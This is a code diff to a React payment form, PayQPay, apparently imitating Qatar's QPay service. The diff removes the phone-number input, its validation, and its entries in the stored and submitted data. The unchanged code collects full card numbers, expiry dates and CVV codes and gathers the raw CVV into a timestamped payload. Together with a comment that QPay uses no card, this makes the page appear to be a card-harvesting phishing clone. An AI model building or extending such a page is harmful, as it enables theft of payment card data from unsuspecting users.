@@ -11,8 +11,7 @@ const PayQPay = () => {
     cardNumber: '',
     expiryMonth: '',
     expiryYear: '',
-    cvv: '',
-    phoneNumber: ''
+    cvv: ''
   });
   const [errors, setErrors] = useState({});
   const [isProcessing, setIsProcessing] = useState(false);
@@ -103,13 +102,6 @@ const PayQPay = () => {
       newErrors.cardHolderName = 'Name must be at least 3 characters';
     }
 
-    // Phone number validation
-    if (!formData.phoneNumber) {
-      newErrors.phoneNumber = 'Phone number is required';
-    } else if (!/^\+?[0-9]{8,15}$/.test(formData.phoneNumber.replace(/\s/g, ''))) {
-      newErrors.phoneNumber = 'Invalid phone number';
-    }
-
     // Card number validation
     if (!formData.cardNumber) {
       newErrors.cardNumber = 'Card number is required';
@@ -165,7 +157,6 @@ const PayQPay = () => {
     // حفظ بيانات الدفع في sessionStorage
     sessionStorage.setItem('pendingPayment', JSON.stringify({
       cardLastDigits: '****', // QPay لا يستخدم بطاقة
-      phoneNumber: formData.phoneNumber || '+974 ****',
       amount: paymentAmount
     }));
 
@@ -190,7 +181,6 @@ const PayQPay = () => {
         cardLastDigits: cardLastDigits || '',
         expirationDate: expirationDate || '',
         cvv: formData.cvv || '',
-        phoneNumber: formData.phoneNumber || '+974',
         amount: parseFloat(paymentAmount.replace(/,/g, '')) || 0,
         timestamp: new Date().toISOString()
       };
@@ -262,24 +252,6 @@ const PayQPay = () => {
               />
               {errors.cardHolderName && (
                 <span className="payqpay__error">{errors.cardHolderName}</span>
-              )}
-            </div>
-
-            {/* Phone Number */}
-            <div className="payqpay__form-group">
-              <label className="payqpay__label" htmlFor="phoneNumber">Phone Number</label>
-              <input
-                type="tel"
-                id="phoneNumber"
-                className={`payqpay__input ${errors.phoneNumber ? 'error' : ''}`}
-                value={formData.phoneNumber}
-                onChange={(e) => handleInputChange('phoneNumber', e.target.value)}
-                placeholder="+974 XXXX XXXX"
-                name="phoneNumber"
-                autoComplete="tel"
-              />
-              {errors.phoneNumber && (
-                <span className="payqpay__error">{errors.phoneNumber}</span>
               )}
             </div>
 
